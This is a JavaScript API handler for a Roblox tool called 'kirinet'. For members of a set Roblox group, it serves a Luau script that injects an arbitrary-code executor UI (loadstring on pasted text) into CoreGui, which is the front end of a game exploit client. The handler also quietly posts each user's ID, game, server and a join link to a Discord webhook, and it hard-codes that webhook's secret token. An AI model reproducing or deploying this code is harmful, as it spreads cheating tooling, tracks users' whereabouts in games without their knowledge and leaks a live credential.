// /api/handler.js

export default async function handler(request, response) {
    const { searchParams } = new URL(request.url, `https://your-base-url.com`);
    const userId = searchParams.get('userId');
    const placeId = searchParams.get('placeId');
    const jobId = searchParams.get('jobId');
    const playerCount = searchParams.get('playerCount');

    const GROUP_ID = 14444888;
    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1386571113076756571/YcRXq-OqpDGfbxzAnDHdVdTEJqhRX7PMqhASI4wsQMIf54pUZC9HxTIJnAdA62rRlu';

    if (!userId) {
        return response.status(400).send('User ID is required');
    }

    let isUserInGroup = false;
    try {
        const robloxApiUrl = `https://groups.roblox.com/v2/users/${userId}/groups/roles`;
        const robloxResponse = await fetch(robloxApiUrl);
        const robloxData = await robloxResponse.json();
        isUserInGroup = robloxData.data && robloxData.data.some(groupInfo => groupInfo.group.id === GROUP_ID);
    } catch (error) {
        // Silently fail
    }

    if (isUserInGroup) {
        const joinUrl = `https://www.roblox.com/games/join?placeId=${placeId}&jobId=${jobId}`;

        const discordPayload = {
            embeds: [{
                title: "Kirinet User Activity",
                color: 3447003, // Blue
                fields: [
                    { name: "Game ID", value: `\`${placeId || 'Unknown'}\``, inline: true },
                    { name: "Server Player Count", value: `\`${playerCount || 'N/A'}\``, inline: true },
                    { name: "User ID", value: `\`${userId}\``, inline: false }
                ],
                timestamp: new Date().toISOString()
            }],
            components: []
        };
        
        if (placeId && jobId) {
            discordPayload.components.push({
                type: 1, // Action Row
                components: [{
                    type: 2, // Button
                    style: 5, // Link
                    label: "Join Game Server",
                    url: joinUrl
                }]
            });
        }
        
        fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(discordPayload),
        }).catch(console.error);

        const luauScript = `
            local CoreGui = game:GetService("CoreGui")
            local KirinetUI = Instance.new("ScreenGui")
            KirinetUI.Name = "KirinetUI"
            KirinetUI.Parent = CoreGui
            KirinetUI.ZIndexBehavior = Enum.ZIndexBehavior.Global
            KirinetUI.ResetOnSpawn = false
            
            local MainFrame = Instance.new("Frame")
            MainFrame.Name = "MainFrame"
            MainFrame.Parent = KirinetUI
            MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
            MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
            MainFrame.Size = UDim2.new(0, 550, 0, 300)
            MainFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
            MainFrame.BorderSizePixel = 0
            
            local UICorner = Instance.new("UICorner")
            UICorner.CornerRadius = UDim.new(0, 8)
            UICorner.Parent = MainFrame
            
            local UIStroke = Instance.new("UIStroke")
            UIStroke.Color = Color3.fromRGB(132, 193, 255)
            UIStroke.Thickness = 1
            UIStroke.Parent = MainFrame
            
            local TopBar = Instance.new("Frame")
            TopBar.Name = "TopBar"
            TopBar.Parent = MainFrame
            TopBar.Size = UDim2.new(1, 0, 0, 30)
            TopBar.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
            TopBar.BorderSizePixel = 0
            
            local UICorner_2 = Instance.new("UICorner")
            UICorner_2.CornerRadius = UDim.new(0, 8)
            UICorner_2.Parent = TopBar
            
            local Title = Instance.new("TextLabel")
            Title.Name = "Title"
            Title.Parent = TopBar
            Title.Size = UDim2.new(0, 100, 1, 0)
            Title.Position = UDim2.new(0, 10, 0, 0)
            Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            Title.BackgroundTransparency = 1.000
            Title.Font = Enum.Font.GothamBold
            Title.Text = "kirinet"
            Title.TextColor3 = Color3.fromRGB(132, 193, 255)
            Title.TextSize = 16.000
            Title.TextXAlignment = Enum.TextXAlignment.Left
            
            local InputBox = Instance.new("TextBox")
            InputBox.Name = "InputBox"
            InputBox.Parent = MainFrame
            InputBox.Position = UDim2.new(0.018, 0, 0.11, 0)
            InputBox.Size = UDim2.new(0.96, 0, 0.75, 0)
            InputBox.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
            InputBox.BorderSizePixel = 0
            InputBox.ClearTextOnFocus = false
            InputBox.Font = Enum.Font.Code
            InputBox.MultiLine = true
            InputBox.Text = "-- paste your script here"
            InputBox.TextColor3 = Color3.fromRGB(220, 220, 220)
            InputBox.TextSize = 14.000
            InputBox.TextXAlignment = Enum.TextXAlignment.Left
            InputBox.TextYAlignment = Enum.TextYAlignment.Top
            
            local UICorner_3 = Instance.new("UICorner")
            UICorner_3.Parent = InputBox
            
            local ButtonFrame = Instance.new("Frame")
            ButtonFrame.Name = "ButtonFrame"
            ButtonFrame.Parent = MainFrame
            ButtonFrame.Position = UDim2.new(0, 0, 0.86, 0)
            ButtonFrame.Size = UDim2.new(1, 0, 0.14, 0)
            ButtonFrame.BackgroundTransparency = 1
            
            local ExecuteButton = Instance.new("ImageButton")
            ExecuteButton.Name = "ExecuteButton"
            ExecuteButton.Parent = ButtonFrame
            ExecuteButton.Position = UDim2.new(0.02, 0, 0.1, 0)
            ExecuteButton.Size = UDim2.new(0, 32, 0, 32)
            ExecuteButton.Image = "rbxassetid://10652391217"
            ExecuteButton.BackgroundTransparency = 1
            
            local ClearButton = Instance.new("ImageButton")
            ClearButton.Name = "ClearButton"
            ClearButton.Parent = ButtonFrame
            ClearButton.Position = UDim2.new(0.1, 0, 0.1, 0)
            ClearButton.Size = UDim2.new(0, 32, 0, 32)
            ClearButton.Image = "rbxassetid://10652410884"
            ClearButton.BackgroundTransparency = 1
            
            local dragging = false
            local dragInput
            local dragStart
            local startPos
            
            TopBar.InputBegan:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                    dragging = true
                    dragStart = input.Position
                    startPos = MainFrame.Position
                    input.Changed:Connect(function()
                        if input.UserInputState == Enum.UserInputState.End then
                            dragging = false
                        end
                    end)
                end
            end)
            
            TopBar.InputChanged:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
                    dragInput = input
                    if dragging and dragInput then
                        local delta = dragInput.Position - dragStart
                        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
                    end
                end
            end)
            
            ExecuteButton.MouseButton1Click:Connect(function()
                local code = InputBox.Text
                local success, err = pcall(function()
                    loadstring(code)()
                end)
                if not success then
                    warn("Kirinet Error:", err)
                end
            end)
            
            ClearButton.MouseButton1Click:Connect(function()
                InputBox.Text = ""
            end)
        `;
        
        response.setHeader('Content-Type', 'text/plain');
        return response.status(200).send(luauScript);
    } else {
        return response.status(200).send('');
    }
}
